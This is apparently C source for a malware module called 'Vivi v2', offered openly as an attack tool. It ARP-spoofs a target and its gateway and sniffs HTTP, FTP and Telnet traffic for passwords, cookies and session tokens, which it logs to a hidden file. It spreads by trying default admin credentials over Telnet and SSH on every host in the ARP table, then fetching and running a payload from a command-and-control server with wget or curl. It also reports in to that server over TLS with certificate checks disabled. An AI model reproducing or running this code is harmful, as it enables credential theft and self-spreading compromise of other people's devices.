#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <openssl/ssl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <time.h>
#include "config.h"

// Vivi v2 - MITM Extension (Pure C, No External Dependencies)
// Performs ARP spoofing, packet sniffing, and auto-infection

// Ethernet header
typedef struct {
    unsigned char dst_mac[6];
    unsigned char src_mac[6];
    unsigned short eth_type;
} __attribute__((packed)) eth_header;

// ARP packet structure
typedef struct {
    unsigned short hw_type;
    unsigned short proto_type;
    unsigned char hw_len;
    unsigned char proto_len;
    unsigned short opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
} __attribute__((packed)) arp_packet;

// Get MAC address of interface
int get_mac_address(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return -1;
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

// Get interface name
const char *get_interface() {
    static char iface[IFNAMSIZ] = {0};
    
    // Try common interface names
    const char *interfaces[] = {"eth0", "ens33", "enp0s3", "wlan0", "wlp2s0", NULL};
    
    for (int i = 0; interfaces[i] != NULL; i++) {
        unsigned char mac[6];
        if (get_mac_address(interfaces[i], mac) == 0) {
            strncpy(iface, interfaces[i], IFNAMSIZ-1);
            return iface;
        }
    }
    
    return "eth0"; // Default fallback
}

// Send ARP reply (spoofing)
int send_arp_reply(const char *iface, const char *target_ip, const char *gateway_ip) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;
    
    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        close(sock);
        return -1;
    }
    int ifindex = ifr.ifr_ifindex;
    
    // Get our MAC
    unsigned char our_mac[6];
    if (get_mac_address(iface, our_mac) < 0) {
        close(sock);
        return -1;
    }
    
    // Build packet buffer
    unsigned char buffer[42];
    memset(buffer, 0, sizeof(buffer));
    
    eth_header *eth = (eth_header *)buffer;
    arp_packet *arp = (arp_packet *)(buffer + sizeof(eth_header));
    
    // Ethernet header - broadcast
    memset(eth->dst_mac, 0xff, 6);
    memcpy(eth->src_mac, our_mac, 6);
    eth->eth_type = htons(ETH_P_ARP);
    
    // ARP reply
    arp->hw_type = htons(1);           // Ethernet
    arp->proto_type = htons(0x0800);   // IPv4
    arp->hw_len = 6;
    arp->proto_len = 4;
    arp->opcode = htons(2);            // ARP Reply
    
    memcpy(arp->sender_mac, our_mac, 6);
    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
    memset(arp->target_mac, 0, 6);
    inet_pton(AF_INET, target_ip, arp->target_ip);
    
    // Send packet
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memcpy(addr.sll_addr, eth->dst_mac, 6);
    
    sendto(sock, buffer, 42, 0, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return 0;
}

// ARP spoof thread - continuously poison ARP cache
void *arp_spoof_thread(void *arg) {
    char **ips = (char **)arg;
    char *target_ip = ips[0];
    char *gateway_ip = ips[1];
    const char *iface = get_interface();
    
    // Enable IP forwarding
    FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (fp) {
        fprintf(fp, "1\n");
        fclose(fp);
    }
    
    printf("[Vivi] ARP spoofing: %s <-> %s on %s\n", target_ip, gateway_ip, iface);
    
    while (1) {
        // Spoof target (tell target we are the gateway)
        send_arp_reply(iface, target_ip, gateway_ip);
        
        // Spoof gateway (tell gateway we are the target)
        send_arp_reply(iface, gateway_ip, target_ip);
        
        sleep(2); // Send every 2 seconds
    }
    
    return NULL;
}

// Packet sniffer - capture credentials from HTTP/FTP/Telnet
void *packet_sniffer_thread(void *arg) {
    (void)arg;
    
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    printf("[Vivi] Packet sniffer started\n");
    
    unsigned char buffer[65536];
    
    while (1) {
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len < 42) continue;
        
        // Parse Ethernet header
        eth_header *eth = (eth_header *)buffer;
        
        // Check if IP packet
        if (ntohs(eth->eth_type) == 0x0800) {
            // Parse IP header
            unsigned char *ip_header = buffer + 14;
            unsigned char protocol = ip_header[9];
            
            // Check for TCP
            if (protocol == 6) {
                unsigned short src_port = (ip_header[20] << 8) | ip_header[21];
                unsigned short dst_port = (ip_header[22] << 8) | ip_header[23];
                
                // Interesting ports: HTTP, FTP, Telnet
                if (dst_port == 80 || dst_port == 21 || dst_port == 23 || src_port == 80) {
                    // Get payload (skip Ethernet + IP + TCP headers)
                    int ip_header_len = (ip_header[0] & 0x0F) * 4;
                    int tcp_header_len = ((buffer[14 + ip_header_len + 12] >> 4) & 0x0F) * 4;
                    char *payload = (char *)(buffer + 14 + ip_header_len + tcp_header_len);
                    int payload_len = len - 14 - ip_header_len - tcp_header_len;
                    
                    if (payload_len > 0 && payload_len < 2000) {
                        // Look for credentials
                        char *keywords[] = {"user", "pass", "login", "pwd", "auth", "cookie", "session", NULL};
                        
                        for (int i = 0; keywords[i] != NULL; i++) {
                            if (strcasestr(payload, keywords[i]) != NULL) {
                                // Log to hidden file
                                FILE *fp = fopen("/tmp/.creds", "a");
                                if (fp) {
                                    time_t now = time(NULL);
                                    fprintf(fp, "[%ld] Port %d: ", now, dst_port);
                                    
                                    // Print only printable characters
                                    for (int j = 0; j < payload_len && j < 200; j++) {
                                        if (payload[j] >= 32 && payload[j] <= 126) {
                                            fputc(payload[j], fp);
                                        }
                                    }
                                    fprintf(fp, "\n");
                                    fclose(fp);
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
    
    close(sock);
    return NULL;
}

// Network scanner and infector
void *scan_and_infect_thread(void *arg) {
    (void)arg;
    
    printf("[Vivi] Auto-infection thread started\n");
    
    while (1) {
        // Read ARP table to discover hosts
        FILE *fp = fopen("/proc/net/arp", "r");
        if (!fp) {
            sleep(60);
            continue;
        }
        
        char line[256];
        fgets(line, sizeof(line), fp); // Skip header
        
        while (fgets(line, sizeof(line), fp)) {
            char ip[32], hw_type[8], flags[8], mac[32], mask[8], dev[16];
            if (sscanf(line, "%s %s %s %s %s %s", ip, hw_type, flags, mac, mask, dev) == 6) {
                
                // Try Telnet with default credentials
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
                    "(echo admin; sleep 1; echo admin; sleep 1; "
                    "echo 'cd /tmp;wget http://%s:8080/higurashi_mini -O .s 2>/dev/null||"
                    "curl -o .s http://%s:8080/higurashi_mini 2>/dev/null;chmod 777 .s;./.s &'; "
                    "sleep 2) | timeout 5 telnet %s 23 >/dev/null 2>&1 &",
                    C2_IP, C2_IP, ip);
                system(cmd);
                
                // Try SSH
                snprintf(cmd, sizeof(cmd),
                    "timeout 3 sshpass -p admin ssh -o StrictHostKeyChecking=no "
                    "-o ConnectTimeout=2 admin@%s "
                    "'cd /tmp;wget -q http://%s:8080/higurashi_mini -O .s 2>/dev/null||"
                    "curl -s -o .s http://%s:8080/higurashi_mini 2>/dev/null;"
                    "chmod +x .s;./.s &' >/dev/null 2>&1 &",
                    ip, C2_IP, C2_IP);
                system(cmd);
            }
        }
        
        fclose(fp);
        sleep(60); // Scan every minute
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.100\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    
    // Get gateway
    char gateway[32] = "192.168.1.1";
    FILE *fp = popen("ip route | grep default | awk '{print $3}'", "r");
    if (fp) {
        if (fgets(gateway, sizeof(gateway), fp) != NULL) {
            gateway[strcspn(gateway, "\n")] = '\0';
        }
        pclose(fp);
    }
    
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════╗\n");
    printf("║           VIVI v2 - MITM Attack Module                    ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n");
    printf("[*] Target: %s\n", target_ip);
    printf("[*] Gateway: %s\n", gateway);
    printf("[*] Interface: %s\n", get_interface());
    printf("\n");
    
    // Connect to C2 and report
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        
        if (SSL_connect(ssl) > 0) {
            char id_buf[128];
            snprintf(id_buf, sizeof(id_buf), "vivi_%s_%d", target_ip, getpid());
            
            json_object *handshake = json_object_new_object();
            json_object_object_add(handshake, "action", json_object_new_string("handshake"));
            json_object_object_add(handshake, "type", json_object_new_string("vivi"));
            json_object_object_add(handshake, "id", json_object_new_string(id_buf));
            json_object_object_add(handshake, "target", json_object_new_string(target_ip));
            json_object_object_add(handshake, "gateway", json_object_new_string(gateway));
            
            const char *json_str = json_object_to_json_string(handshake);
            SSL_write(ssl, json_str, strlen(json_str));
            json_object_put(handshake);
            
            printf("[+] Connected to C2: %s:%d\n", C2_IP, C2_PORT);
        }
        SSL_free(ssl);
    } else {
        printf("[-] Failed to connect to C2, continuing anyway...\n");
    }
    close(sock);
    
    // Start attack threads
    pthread_t arp_thread, sniffer_thread, infect_thread;
    
    char *ips[] = {target_ip, gateway};
    
    pthread_create(&arp_thread, NULL, arp_spoof_thread, ips);
    pthread_create(&sniffer_thread, NULL, packet_sniffer_thread, NULL);
    pthread_create(&infect_thread, NULL, scan_and_infect_thread, NULL);
    
    printf("[+] All attack threads started\n");
    printf("[*] ARP spoofing in progress...\n");
    printf("[*] Credentials will be logged to /tmp/.creds\n");
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Keep alive
    pthread_join(arp_thread, NULL);
    
    return 0;
}